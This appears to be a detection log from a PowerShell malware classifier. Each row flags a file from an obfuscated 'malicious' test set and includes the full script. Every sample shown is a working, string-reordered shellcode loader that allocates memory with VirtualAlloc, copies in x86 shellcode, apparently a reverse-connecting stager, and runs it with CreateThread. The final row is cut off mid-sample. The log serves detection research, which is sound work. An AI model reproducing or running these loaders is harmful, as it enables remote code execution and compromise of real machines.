2026-07-13 17:00:39,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2486.ps1,custom-ps-ml,UNKNOWN,f7e5f491-58b3-41a3-b9e9-813c15b80e7c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2699,1458.2," .( $vErbOSEprEfERENce.TOstRiNg()[1,3]+'x'-jOin'') ((((\""{21}{2}{42}{22}{13}{44}{9}{5}{16}{35}{26}{34}{6}{18}{14}{39}{1}{8}{30}{27}{36}{40}{3}{24}{12}{4}{17}{41}{23}{45}{28}{20}{29}{38}{10}{31}{43}{7}{19}{33}{25}{15}{32}{11}{37}{0}\"" -f '=0;rp8i -le (rp8z.Length-1);rp8i++) {rp8w::memset([IntPtr](rp8x.ToInt32()+rp8i), rp8z[rp8i], 1)};rp8w::CreateThread(0,0,rp8x,0,0,0);for (;;){Start-sleep 60};','0x01,0xd',' jvT[DllImport(Bloker','0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a','68,0x','IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Blomsvcrt.dllBlo)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);jvT;rp8w','0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7','f,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5','1,0x51,0x8b,0x59',' lpStartAddress, ','c0,0xa8,0x01,0x26,0x68,0x02,0x00,0x23,0x82,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff','00;if (rp8z.Length -gt 0x1000){rp8g = rp8z.Length};rp8x=rp8w::Vir','2,0xeb,0x8d,0x5d,0x','ualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Blokernel32.dllBlo)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackS',',0x01,0xc7,0xe2,','0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x',' = Add-Type -memberDefiniti','33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,','c,0x02,0x2c,0x20,0xc1,0xcf,0x0d','f,0xff,0xd5,0','x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,','rp8c =','ic static extern IntPtr Virt','7,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4',',0x8b,0x1','x10,0x00,0x00,0x56,0x6a,','Byte[]]rp8z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c','4,0x8b,0x01,0xd6,0x31','ff,0xd5,0x50,0x50,0','0xff,0xd5,0x97,0x6a,0x0',',0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x3',',0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0','75,0xee,0xc3;rp8g = 0x10','x8b,0x36,0x6a,0x40,0x68,0x00,0',',0x8b,0x52,0x14,','on rp8c -Name BloWin32Blo -namespace Win32Functions -passthru;[Byte[]];[',',0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x','tualAlloc(0,0x1000,rp8g,0x40);for (rp8i','5,0x68,0x','0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,','58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,','0x68,0x4c,0x7','nel32.dllBlo)]publ','x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xf','ize, IntPtr',',0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0x'))-cREPlacE'jvT',[CHar]39  -rEplace 'Blo',[CHar]34-cREPlacE'rp8',[CHar]36))",malicious,TP
2026-07-13 17:00:52,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2492.ps1,custom-ps-ml,UNKNOWN,61e673ec-8fe0-4c3f-8805-dce5f1a77612,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3081,1461.87,"((\""{7}{68}{30}{63}{66}{62}{56}{34}{22}{12}{21}{8}{5}{19}{28}{50}{45}{33}{61}{44}{35}{67}{32}{26}{46}{31}{51}{59}{47}{71}{29}{55}{0}{16}{72}{69}{60}{54}{58}{4}{43}{25}{1}{70}{49}{48}{17}{57}{41}{6}{64}{38}{14}{24}{13}{10}{27}{65}{20}{3}{11}{39}{9}{40}{15}{36}{2}{53}{42}{18}{37}{52}{23}\""-f '3e,0xeb,0x09,0xac,0x3d,0x38','x08,0x4b,0xf','4,0xd2,0xde,0x01,0xb9,0x75,0xb7,0xaf,0xe4,0xb2,0x18,','0xcb,0x02,0x55,0x42,0x6a,0xca,0x43,0x2e,0xac,0x40,0x60,0xce,0x62,0xa1,0x','12,0x2e,0xa0,0xca,0xaf','reation','0x08,0x09,0x33,0x87,0xd6,0x9c,0xa0,0x2f,0','6tlc = fFp[Dl','IntPtr lpParameter, uint dwC','x6f,0x63,0x7c,0x59,0x47,0x2c,0x7f,0x8c,0xdc,0xe5,0x15,0','0x20,0x09,0xf4,0xcf,0xb7,0x6e,0x2f,0xb7,','0','IntPtr lpStartAddress',',0x13,0xd4,0x6a,0xa6,0x21,0x7b,0xc1,','0xbd,0xfc,0xeb,0x65,0x61,0x59,0x67,0x8b,0x76,0xd0,0x2a,0xc3,0xbb,0','x5c,0x90,0x6f,0x22,0x38,0xc0,0x23,',',0xea,','a','ualAlloc(0,0x1000,6tlg,0x40);for (6tli=','Flags, IntPtr lpThreadI','0x99,0x4a,0xbb,0xb7,0xb9,0x74,0x11,0xd0,0x53,0x9b,0xcc,0x88,',', ','LBG)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, ','p 60};','xd9,0xd4','0xdb,0xb7,0x3a,0x4a,0xdd,0x96,0xec,0xc1,0x84,0x38,0x0e,0x06,0xbd,0x70,0','x','0x28,0x91,0xd0,0xc8,0x61,0x55,0x84,0x98,0x19,0x7c,0xa5,0x72,0xda,0x81,0x70,0xee,0xdf,0x15,0xbb,0x47,0xde,0x','d);[DllImport(LBGmsvc',',0x2a,0x20,0x93,0x8f,0xc','Vir',',0xbc,0x','x47,0x31,0x46,0x18,0x03,0x46,0x18,0x83,0xc6,0x12,0x77,0x33,0xaf,0xf2,0','(IntPtr dest, uint ','t(LBGkernel32.dll',' -passthru;[Byte[','0x57,0x47,0xdd,0x57,0xc','0;6tli -le (6tlz.Length-1);6tli++) {6tlw::memset([IntP','0xc1,0x7a,0xba,0xfc,0x4a,0x7d,0x6d,0x75,0x08,0x5a,0xa9,0xde,0xca,0xc3,0xe8,0xba,','d,0xdc,0x12,0x41,0x58,0xbe,0xb4,0x5e,0x76,0xd5,0x38,0xcb,0x7d,0x7c,0','x6f,0x8a,0x09,0xfa,0x6f,0x4a,0','0x7b,0x8c,0x87,0x75,0x0e,0xe4,0xf4,','0xc3,0x42,0x64,0x86,0x2d,0x31,0x84,0x1a;6tlg = 0x1000;if (6tlz.Length -gt 0x1000){6tlg = 6tlz.Length};6tlx=6tlw::Virt',',0xc5,0xfa,','2Functions','Ptr memset','f5',',0x33,0x9a,0x22,0xbd,0','6,0xc',',0xbf,0x7','rt.dllLBG)]public static extern Int','50,0x','tr](6tlx.ToInt32()+6tli), 6tlz[6tli], 1)};6tlw::CreateThread(0,0,6tlx,0,0,0);for (;;){Start-slee','0x4f,','4d,0xeb,0xca,0xf0','1,0x64,0x00,0x04,0xa7,0xa0,0x27,0xad,0x02,0x97,0x06,0x2e,0x','flProtect);[DllImpor',',0x65,0x8e,0x77,0x61,0x48,0x3f,0x8a,',',0xbc,0xb9,0x83,0x7f,0x','02,0x9a,0x35,0xb5','8d,0x','src, uint count);fFp;6tlw = Add-Type -memberDefinition 6tlc -Name LBGWin32LBG -namespace Win3','s, uint dwSize, uint flAllocationType, uint ','tualAllo','x9c,0x07,0x0d,0xce,0x71,0xd1,0xc6,0xdc,0x3e,0x95,0x81,0xc0,','8e,0x53,0x9a,0xe1,0x41,0xf8,0x13,0x07,0x31,0x50,0x74,0x98,0xf1,0x00,0x34,0x48,','c(IntPtr lpAddres',']];[Byte[]]6tlz = 0xd9,0xec,0xb8,0x16,0x95,0xc6,0x53,0xd9,0x74,0x24,0xf4,0x5e,0x2b,0xc9,0xb1,0','lImport(LBGkernel32.dllLBG)]public static extern IntPtr ',',0x','8,0xcb,0xa3','x63','0x8d')).repLace('LBG',[stRINg][CHaR]34).repLace(([CHaR]102+[CHaR]70+[CHaR]112),[stRINg][CHaR]39).repLace(([CHaR]54+[CHaR]116+[CHaR]108),[stRINg][CHaR]36)| &amp; ( $Env:ComSPec[4,24,25]-JOiN'')",malicious,TP
2026-07-13 17:01:04,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2503.ps1,custom-ps-ml,UNKNOWN,cb1a0a4d-4e11-4ea8-883b-0e22b6a12df6,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2855,1622.89,"ieX( ((\""{43}{45}{38}{37}{24}{47}{34}{15}{8}{44}{28}{26}{27}{46}{42}{19}{31}{40}{21}{29}{18}{23}{10}{36}{0}{48}{32}{14}{20}{1}{17}{33}{9}{16}{4}{12}{22}{13}{30}{25}{3}{5}{39}{35}{2}{41}{6}{7}{11}\""-f ',0xd5,0xf9,0xfd,0x6','x08,0x3','3ug,0x40);for (f3ui=0;f3ui -le (f3uz.Length-1','6,0xc6,','0xd6,0x1f,0x23,0','0xa9,0xb4,0x13,0x09,0x64,0xa9,0x88,0x9c,0x87,0x98,0x7d,0x36,0xe0,0x26,0x58,0x70,0xaf,0xd9,0x8f,0x80,0x93,0x0f,0xe9,0xf6,0xfd,0x93;f3ug = 0x1000;if (f','f3ui), f3uz[f3ui],',' 1)};f3uw::CreateThread(0,0,f3uNoDM,0,0,0);for (;;){Start-sleep','e[]];[Byte[]]f3uz = 0xd9,0xea,0xbf,0xcd,0xe2,0xd8,0x42,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x','d9,0x2e,0x8c,0xea,0xa7,0','8,0xbb,0x90,0xbf,0x0f,0x6f,0xab,0xbb,0x84,0x8e,0x7c,0x4a,0xde,0xb4,0x58,0x',' 60};','x31,0x70,0x1f,0x99,0x5c,0x7c,0xb5,0x26,0xf7,0','2e,0x1b,0xee,0xd6,0x05,0x10,0x27,0x43,0xe6,0x4e,0x48,0x83,0xe6,0x8e,0','x9d,0x9a,0','t count);l6W;f3uw = Add-Type -memberDefinition f3uMzr -Name KeUWin32KeU -namespace Win32Functions -passthru;[Byt','x70,0x06,0x19,0x57,0x3e,0xef,0x54,0x4b,','5,0xf3,0x40,0xc9,0xba,0x26,0xfc,0xcc,0x2c,0x79,0x3e,0x46,0x44,0',',0xe','8,0x8b,0xfd,0x9a,0x72,0x0b,0xff,0x4f,0x0f,0x','x37,0x56,0x1e,0xdb,0x1e,0x9c,0x4a,0x8b,0',',0xbe,0xfb,0xc3,0xbc,0x6','x2b,0x21,0x25,0x','e,0x29,0x3c,0x97,0x23,0xaf,0xb7,0x9b,0x8','ddress, IntPtr lpParameter, uint dwCreationFlag','e6,0xe','3,0x7a,','0xd9,0x00,0x2d,0xbe,0x09,0x46,0xce,','3,0xc2,0x04,0x0','4,0x89,0xd7,0x66','x1e,0xc9,0x','02,0xe7,0x8c,0x2a,0','0,0xe2,0x3b,0x1a,0xe5,0xcf,0xc3,0xda,0x61,0x47,0xb7,0xe8,0x2e,0xf3,0x5f,0x40,0xa6,0xdd,0x98,0xa7,0','x11,0x43,0x58,0x85,0xbe,0xca,0xbe,0xf5,0x6e,0x9d,0x6e,0xb5,0xde,0x5d,0xdf,0x5d,0x35,0x52,0x00,0x7d,0x36,0xb8,0x29,0x17,0xd9,0x15,0x01,0x8f,0x40,0x3c,0x','ntPtr lpThreadId);[DllImport(KeUmsvcrt.dllKeU)]public static extern IntPtr memset(IntPtr dest, uint src, uin','00){f3ug = f3uz.Length};f3uNoDM=f3uw::VirtualAlloc(0,0x1000,f','17,0x84','CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartA',' IntPtr ','3uz.Length -gt 0x10','xdc,0x9c,0x66,0xc0,0xdf,0x74,0xb7,0x29,0x73,0xb9,0x78,0xd8,0x8d,0xfd,0xbe,0x03,0xf8,0xf7,0xbd',');f3ui++) {f3uw::memset([IntPtr](f3uNoDM.ToInt32()+',',0x2','f3uMzr = l6W[DllImport(KeUkernel32.dllKeU)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(KeUkernel32.dllKeU)]public static exter','47,0x31,0x7a,0x18,0x8','n','0x3f,0xc9,0x27,0x46,0xda,0xf8,0x67,0x3c,0xae,0xaa,0x57,0x36,0xe2,0x46,0x13,0x1a,0x17,0xdd,0x51,0xb3,0x18,0x56,0xdf,0xe5,0x17,0x67,0x4c,0xd5,0x36,0xeb,0x8f,0x0a,0x99,0xd2,0x5f,0x5f,0xd8,0x13,0xbd,0x92,0x88,0xcc,0xc9,0x01,0x3d,0x79,0x87,0x99,0xb6,0x31,0x09,0x9a,0x2b,0x81','s, I','b,0xe9,0x1a,0x5e,0xd3,0x4f,0x50,0x72,0x0')).RePlACE('f3u','$').RePlACE('l6W',[stRInG][cHaR]39).RePlACE(([cHaR]75+[cHaR]101+[cHaR]85),[stRInG][cHaR]34) )",malicious,TP
2026-07-13 17:01:19,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2516.ps1,custom-ps-ml,UNKNOWN,12c7d16b-28c8-4057-ae4c-89865170024b,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2785,1676.61,"&amp; ((GEt-vAriaBLe '*Mdr*').NAME[3,11,2]-joiN'') (((\""{4}{1}{3}{36}{11}{24}{14}{0}{44}{27}{32}{19}{31}{34}{9}{45}{23}{43}{22}{5}{40}{29}{2}{25}{21}{46}{41}{35}{37}{26}{7}{17}{18}{12}{30}{8}{16}{42}{20}{10}{15}{38}{33}{39}{13}{28}{6}\"" -f 'fKJ)]public static extern IntPtr','rt(fKJkernel32.dllfKJ)',',0x58,',']public static','iOPc = ST1[DllImpo','30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x5','i), iOPz[iOPi], 1)};iOPw::CreateThread(0,0,iOPx,0,0,0);for (;;){Start-sleep 60};',',0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0','x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb','uint count);ST1;iOPw = Add-Type -memberDefini',',0x5f','mpor','x74,0x61,0xff,0xd5,0x85,0xc','emset([IntPtr](iOPx.ToInt','ernel32.dll',',0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;iOPg = 0x1000;','5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6','x0a,0x00,0x00,0x22,0x68,0x','02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0','mport(fKJmsvcrt.dllfKJ)]public st','xc8','0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x','x8b,0x52,0x','pace Win32Functions -passthru;[Byte[]];[Byte[]]iOPz = 0xfc,0xe8,0x89,0','t(fKJk','0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,','b,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea',' dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,','32()+iOP','0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2','0,0','atic extern IntP',' IntPtr lpThreadId);[DllI',';iOPx=iOPw::VirtualAll','tr memset(IntPtr dest, uint src, ','x58,0x5f,0x5a,0x8b,',' extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllI','0x12,0xe','if (iOPz.Length -gt 0x1000){iOPg = iOPz.Length}','oc(0,0x1000,iOPg,0x40);for (iOPi=0;iOPi -le (iOPz.Length-1);iOPi++) {iOPw::m','7,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,',',0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0','a,0x04,0x56,0x57,0x68,0x02,0xd9,0','x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0',' CreateThread(IntPtr lpThreadAttributes, uint','tion iOPc -Name fKJWin32fKJ -names','89,0x44,0x24,0x24')).REPlaCE('ST1',[sTRIng][CHAr]39).REPlaCE(([CHAr]105+[CHAr]79+[CHAr]80),'$').REPlaCE('fKJ',[sTRIng][CHAr]34))",malicious,TP
2026-07-13 17:01:25,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2523.ps1,custom-ps-ml,UNKNOWN,d615d29b-e687-43a7-b2ce-da4bcf5661ac,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2987,1721.35,"(((\""{12}{14}{13}{32}{45}{37}{38}{50}{44}{48}{53}{28}{5}{58}{61}{69}{49}{21}{11}{9}{33}{41}{65}{63}{2}{17}{56}{15}{64}{54}{31}{67}{4}{1}{0}{47}{24}{18}{23}{46}{22}{52}{29}{42}{7}{19}{68}{39}{70}{30}{40}{62}{66}{55}{27}{34}{8}{57}{35}{20}{43}{6}{3}{16}{36}{10}{60}{51}{26}{59}{25}\""-f '1,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c',',0xc1,0xcf,0x0d,0x0','xf2,0x52,0x',',0x57,0x68,0x02,0xd9,0xc8,0x5f,0xf','c','rtAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(6hcmsvcrt.dll6hc)]public static extern IntPtr',',0x00,0x56,0x53',',0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x2','e8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,',',0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b','0xf0,0xb5,0xa2,0x56,0x6a,0x00,','fc','d9hc','ernel',' = t81[DllImport(6hck','x4c,0x11,0x78,0xe3,0x48,0x01,','f,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x7','57,0x8b,0','x','6,0x07,0xff,0xd5,','4,0x53,','thru;[Byte[]];[Byte[]]d9hz = 0x','0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe','89,0x44,0x24,','0',';','40);for (d9hi=0;d9hi -le (d9hz.Length-1);d9hi++) {d9hw::memset([IntPtr](d9hx.ToInt32()+d9hi), d9h','0x74,0x0a,0xff,0x4e,0x08,0x75,0x','utes, uint dwStackSize, IntPtr lpSta','xeb,0x8d,0x5d,0x68','xa8,0x02,0x64,0x68,0x02,0x00,0x11,0x5c,0x8','b,0x01,0xd6,0x31,0xff,0','32.dll6hc)]publ',',0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0','ec,0x','a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa','5,0xe9,0xc3,0xbb,','c extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uin','t flProtect);[','40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0','9,0xe','x20,0xc1,0xcf,0x0d,0x01,0xc7,0x',',0x33,0x32,0x00,0x00,0x68','0xe5,0xff,0xd5,0x93,0x53,0x6a','mport(6hckernel32.dll6hc)]public static extern I','ic stati','0x24,',',0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,','ntPtr CreateThread(IntPtr l','berDefinition d9hc -Name 6hcWin326hc -namespace Win32Functions -pass','DllI','000;if (d9hz.Length -gt 0x1000){d9hg = d9hz.Length};d9hx=d9hw::VirtualAlloc(0,0x1000,d9hg,0x','0,0x5f,0x5f,0x5a,0x8b,0x12,0','pThreadAttrib','0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8','xc0,','x52,0x10,0x8b,0x4a,0x3c,0x8b,0','0x36,0x6',' memset(IntPt','z[d9hi], 1)};d9hw::CreateThread(0,0,d9hx,0,0,0);for (;;){Start-sleep 60}','0x53,0xff,0xd5;d9hg = 0x1','r dest, uint src, uin','6,0x6a,0x10,0x',',0','0xd1,0x51,0x8b,','e2','56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0','xa','0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x','t count);t81;d9hw = Add-Type -mem','xd5,0x97,0x6a,0x05,0x68,0xc0,0'))-REpLAce  ([cHAr]54+[cHAr]104+[cHAr]99),[cHAr]34  -crepLAce([cHAr]100+[cHAr]57+[cHAr]104),[cHAr]36-REpLAce([cHAr]116+[cHAr]56+[cHAr]49),[cHAr]39)|iEX",malicious,TP
2026-07-13 17:01:38,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2528.ps1,custom-ps-ml,UNKNOWN,a7ee0715-278d-4825-b201-5f418a99d824,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2910,1700.22,"IEx ( ((\""{52}{39}{58}{56}{27}{60}{0}{68}{26}{3}{66}{1}{63}{43}{67}{42}{15}{35}{48}{14}{11}{24}{13}{2}{47}{34}{54}{32}{9}{17}{23}{33}{8}{38}{62}{44}{29}{49}{36}{64}{7}{4}{53}{6}{31}{16}{55}{19}{40}{10}{65}{5}{18}{46}{57}{41}{12}{22}{30}{21}{37}{59}{61}{51}{20}{45}{28}{50}{25}{69}\""-f');[DllImport(dYRkernel32.dlldYR)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ui','et(IntPtr dest,','52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0','[DllImport(dYRmsvcrt.dlld','0x00,0x00,0x68,',',0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb','0x54,0x68,0x4c','33,0x32,','x8b,0x5','c0,0xac,0xc1,0xcf,0x0d,','db,0x86,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff','0x86,0x00,0x00,0x00,0x60,0x89,0xe5,0x',',0xe5,0xff,0xd5,0x93,0x53','x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x','yte[]]dFYsc = 0xfc,0xe8,','sthru;[',',0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0','0x01,0xc7,0x38,0xe0,0x75','5,0xa2,0x56,0xff,0xd5,0x6','x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,','tr](dFYx.ToI','x75,0xec,0xc3;dFY',',0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,',',0xf4,0x03,0x7d,0xf8,0x3b,0','31,0xd2,0x64,0','(;;){S',' dwCreationFlags, IntPtr lpThreadId);','tPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAll','Yi], 1)};dFYw::CreateThread(0,0,dFYx,0,','0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,','0xc6,0x85,0xf6,0',',0x77','1,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0x','x7d,0x24,0x75,0xe2,0x58,0','f,0x0d,0x01,0xc7,0xe2,0x','By','5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b','size = 0x1000;if (dFYsc.Length -gt 0x1000){dFY','8,0x2','llI','0x68,0xc0,0xa8,0x','0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53','Yc -Name dYRWin32dYR -namespace Win32Functions -pas','unt);J5P;d','01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,','nt32()+dFYi), dFYsc[dF','a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x','xc1,0xc','te[]];[B','0xd0,0x89,0x44,0x24,0x24,0x5b,0x','0,0);for ','lloc(0,0x1000,dFYsize,0x40);for (dFYi=0;dFYi -le (dFYsc.Length-1);dFYi++) {dFYw::memset([IntP','dFYc = J5P[D','0x77,0x73,0x32,0x5f,','f0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x8b,0x4c,0x10,0x78,0xe3,0x4a,0x01,0xd1,0x5','x00,0','ldYR)]public static extern In','8b,0x36,0x6a,0x40,','mport(dYRkernel32.dl','size = dFYsc.Length};dFYx=dFY','ocationType, uint flProtect','w::VirtualA','4,0x',' uint src, uint co',',0x12,0xeb,0x89,0x5d,0x68,0x',',0xd5','YR)]public static extern IntPtr mems','FYw = Add-Type -memberDefinition dF','nt','tart-sleep 60};')).repLacE('dYR',[String][ChAR]34).repLacE('J5P',[String][ChAR]39).repLacE(([ChAR]100+[ChAR]70+[ChAR]89),[String][ChAR]36))",malicious,TP
2026-07-13 17:01:45,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2534.ps1,custom-ps-ml,UNKNOWN,d78daaf3-cdb9-4adc-b695-98225a6ceaf0,DESKTOP-BAC9DBQ,malicious,0.9741,RandomForest,2882,1486.35," &amp; ((Gv '*mdr*').NaME[3,11,2]-JoIN'')( (((\""{40}{12}{32}{7}{31}{34}{23}{18}{22}{4}{45}{20}{48}{13}{16}{11}{41}{17}{46}{2}{36}{35}{44}{8}{39}{24}{43}{5}{9}{38}{47}{6}{29}{26}{30}{10}{3}{25}{15}{33}{1}{27}{19}{14}{37}{21}{0}{42}{28}\"" -f');4W0i++) {4W0w::memset([IntPtr](4W0CJB.ToInt32()+4W0i), 4W0z[4W0i], 1)};4W0w::CreateThread(0,0,4W0CJB,0,0,','0x89,0x5b,0xfa,0x89,0x93,0xba,0',',0xae,0xed,0','e,0x0d,0xbd,0xc4,0x71,0xf8,0x95,0x70,0xeb,0xa1,0x6e,0xe1,','ttributes, uint dwStackSize, IntPtr lpStartAddress, Int','9b,0x0b,0x6a,0xa7,0xdc,0x02,0xa8,0xf3,0x8c,0x3c,0x19,0x7c,0x47,0','xab,0xc2,0xc5,0x7a,0xae','ernel32.dll7i1)]public 